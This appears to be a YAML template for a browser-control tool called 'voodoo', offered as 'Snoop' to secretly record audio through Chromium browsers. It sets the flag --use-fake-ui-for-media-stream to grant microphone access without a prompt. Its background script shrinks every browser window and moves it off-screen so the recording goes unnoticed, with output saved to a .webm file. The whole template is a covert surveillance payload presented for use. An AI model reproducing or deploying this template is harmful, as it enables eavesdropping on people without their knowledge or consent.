info:
  name: Snoop
  description: Secretly record audio with chromium based browsers.
  usage: |
    voodoo template ./snoop -o play.webm
    voodoo template ./snoop -o play.webm --params save:1000

scripts:
  - file: snoop.js
  - content: |
      const sleep = ms => new Promise(resolve => setTimeout(resolve,ms));
      chrome.windows.getAll({}, async (windows) => {
        for (let w of windows){
          chrome.windows.update(w.id, {width: 200, height: 100});
          chrome.windows.update(w.id, {left: -550, top: 1000});
        }
      })
    background: true

format: payload:base64decode

browser:
  name: chrome
  flags: --use-fake-ui-for-media-stream
  urls:
    - https://example.com
